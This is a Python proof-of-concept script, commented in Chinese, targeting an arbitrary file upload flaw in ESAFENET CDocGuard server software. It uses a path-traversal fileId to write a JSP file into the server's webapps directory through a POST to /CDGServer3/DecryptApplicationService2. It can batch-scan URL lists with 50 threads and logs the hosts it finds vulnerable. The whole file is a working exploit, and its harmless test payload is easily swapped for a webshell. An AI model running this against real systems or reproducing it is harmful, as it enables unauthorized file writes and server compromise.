# 亿赛UploadFileFromClientServiceForClient 通存在任意文件上传
import argparse,requests,sys,time,re
from termcolor import colored
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    test = """
██╗   ██╗███████╗      ██╗   ██╗██████╗ ██╗      ██████╗  █████╗ ██████╗ 
╚██╗ ██╔╝██╔════╝      ██║   ██║██╔══██╗██║     ██╔═══██╗██╔══██╗██╔══██╗
 ╚████╔╝ ███████╗█████╗██║   ██║██████╔╝██║     ██║   ██║███████║██║  ██║
  ╚██╔╝  ╚════██║╚════╝██║   ██║██╔═══╝ ██║     ██║   ██║██╔══██║██║  ██║
   ██║   ███████║      ╚██████╔╝██║     ███████╗╚██████╔╝██║  ██║██████╔╝
   ╚═╝   ╚══════╝       ╚═════╝ ╚═╝     ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ 
                                                                         
                                                author:果冻
"""
    colored_color = colored(test, 'blue')
    print(colored_color)



def main():
    banner()
    parser = argparse.ArgumentParser(description='亿赛UploadFileFromClientServiceForClient 通存在任意文件上传漏洞POC')
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入你要测试的URL")
    parser.add_argument('-f','--file',dest='file',type=str,help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




def poc(target):
    api_payload = '/CDGServer3/DecryptApplicationService2'
    headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'close'
}
    params = {
    'fileId': '../../../Program+Files+(x86)/ESAFENET/CDocGuard+Server/tomcat64/webapps/CDGServer3/test111.jsp'
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    data = '<%out.print("test1234");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
    res = requests.get(url=target)
    if res.status_code == 200:
        try:
            response = requests.post(url=target+api_payload,headers=headers,params=params,verify=False,data=data,proxies=proxies)
            if response.status_code == 200 :
                print(f"[+]{target} 存在文件上传漏洞")
                with open('result.txt','a') as fp:
                    fp.write(target+'\n')
            else:
                print(f"[-]{target} 不存在文件上传漏洞")
        except:
            print(f"[X]{target} 该站点无法访问")


if __name__ == '__main__':
    main()